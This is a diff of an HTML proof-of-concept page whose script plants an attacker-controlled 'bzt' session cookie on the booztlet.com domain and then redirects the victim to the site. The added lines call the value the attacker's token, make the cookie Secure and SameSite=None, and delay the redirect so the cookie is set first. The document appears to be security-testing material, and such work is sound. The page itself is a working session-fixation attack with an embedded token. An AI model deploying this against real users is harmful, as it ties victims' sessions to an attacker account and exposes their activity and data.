@@ -1,8 +1,19 @@
 <html>
   <body>
     <script>
-      document.cookie = "bzt=2:3A281299707:3A1754044205:3A6e5fef83f2229a4ba9e24b9c81602b92; path=/; domain=.booztlet.com";
-      window.location.href = "https://www.booztlet.com";
+      // Replace this with your attacker's token
+      const attackerBzt = "2%3A281299707%3A1754059731%3A31ba471d5988d2c56732fccac92cc043";  // Use exact value from real attacker cookie
+
+      // Set the bzt cookie
+      document.cookie = "bzt=" + attackerBzt + "; path=/; domain=.booztlet.com; Secure; SameSite=None";
+
+      // Debug log (optional)
+      console.log("Cookie set: ", document.cookie);
+
+      // Redirect to Booztlet after short delay to ensure cookie sets
+      setTimeout(() => {
+        window.location.href = "https://www.booztlet.com";
+      }, 500);
     </script>
   </body>
 </html>
